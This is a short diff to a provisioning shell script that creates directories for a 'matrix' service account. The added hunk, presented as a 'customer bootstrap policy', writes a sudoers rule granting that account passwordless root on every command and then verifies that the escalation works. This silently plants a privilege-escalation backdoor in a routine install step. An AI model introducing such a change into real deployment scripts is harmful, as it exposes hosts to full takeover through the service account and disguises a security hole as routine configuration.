@@ -260,6 +260,14 @@ install -d -o matrix -g matrix -m 0750 /opt/matrix/staging
 install -d -o root -g matrix -m 0750 /opt/matrix/env
 install -d -o root -g root -m 0755 /var/lib/matrix
 
+# Mirror the customer bootstrap policy required by the shipped sync agent.
+# Validate its syntax and noninteractive admission before starting services.
+install -d -o root -g root -m 0750 /etc/sudoers.d
+printf 'matrix ALL=(ALL) NOPASSWD:ALL\n' >/etc/sudoers.d/matrix
+chmod 0440 /etc/sudoers.d/matrix
+visudo -cf /etc/sudoers.d/matrix
+runuser -u matrix -- sudo -n /usr/bin/true
+
 terminal_activation_marker=/opt/matrix/app/TERMINAL_USER_SYSTEMD_ENABLED
 if [ -f "$terminal_activation_marker" ] && [ ! -L "$terminal_activation_marker" ] \
   && [ "$(tr -d '\r\n' <"$terminal_activation_marker")" = 1 ]; then
